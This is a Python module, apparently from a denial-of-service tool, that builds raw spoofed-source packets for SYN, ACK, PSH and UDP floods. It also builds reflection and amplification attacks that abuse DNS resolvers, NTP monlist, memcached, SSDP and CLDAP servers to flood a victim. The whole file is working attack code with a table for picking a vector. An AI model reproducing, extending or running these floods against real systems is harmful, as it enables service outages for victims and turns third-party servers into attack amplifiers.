"""Layer-4 vectors. Write raw frames with configurable source spoofing."""
from __future__ import annotations

import os
import random

from ..context import Ctx
from ..packets import (
    CLDAP_ROOTDSE,
    NTP_MONLIST,
    SSDP_MSEARCH,
    build_tcp,
    build_udp,
    dns_query,
    rand_ip,
    rand_port,
)


def _src(c: Ctx) -> str:
    return c.src_ip if c.src_ip is not None else rand_ip(c.net)


def _send(c: Ctx, pkt: bytes) -> None:
    c.raw().sendto(pkt, (c.dst, 0))


def _send_to(c: Ctx, pkt: bytes, host: str) -> None:
    c.udp_raw().sendto(pkt, (host, 0))


def syn(c: Ctx) -> None:
    payload = os.urandom(random.randint(0, 64)) if c.junk else b""
    _send(c, build_tcp(_src(c), rand_port(), c.dst, c.dport,
                       random.getrandbits(32), 0, 0x02, payload))


def ack(c: Ctx) -> None:
    _send(c, build_tcp(_src(c), rand_port(), c.dst, c.dport,
                       random.getrandbits(32), random.getrandbits(32), 0x10))


def psh(c: Ctx) -> None:
    _send(c, build_tcp(_src(c), rand_port(), c.dst, c.dport,
                       random.getrandbits(32), random.getrandbits(32), 0x18,
                       os.urandom(random.randint(200, 1400))))


def udp(c: Ctx) -> None:
    _send(c, build_udp(_src(c), rand_port(), c.dst, c.dport,
                       os.urandom(random.randint(16, 1024))))


def dns(c: Ctx) -> None:
    if not c.resolvers:
        return
    host = random.choice(c.resolvers)
    name = f"{os.urandom(4).hex()}.{c.domain}"
    _send_to(c, build_udp(_src(c), rand_port(), host, 53, dns_query(name)), host)


def ntp(c: Ctx) -> None:
    if not c.ntp:
        return
    host = random.choice(c.ntp)
    _send_to(c, build_udp(_src(c), rand_port(), host, 123, NTP_MONLIST), host)


def memcached(c: Ctx) -> None:
    if not c.memcached:
        return
    host = random.choice(c.memcached)
    _send_to(c, build_udp(_src(c), rand_port(), host, 11211, b"stats items\r\n"), host)


def ssdp(c: Ctx) -> None:
    if not c.ssdp:
        return
    host = random.choice(c.ssdp)
    _send_to(c, build_udp(_src(c), 1900, host, 1900, SSDP_MSEARCH), host)


def cldap(c: Ctx) -> None:
    if not c.cldap:
        return
    host = random.choice(c.cldap)
    _send_to(c, build_udp(_src(c), rand_port(), host, 389, CLDAP_ROOTDSE), host)


VECTORS = {
    "syn": syn, "ack": ack, "psh": psh, "udp": udp, "dns": dns,
    "ntp": ntp, "memcached": memcached, "ssdp": ssdp, "cldap": cldap,
}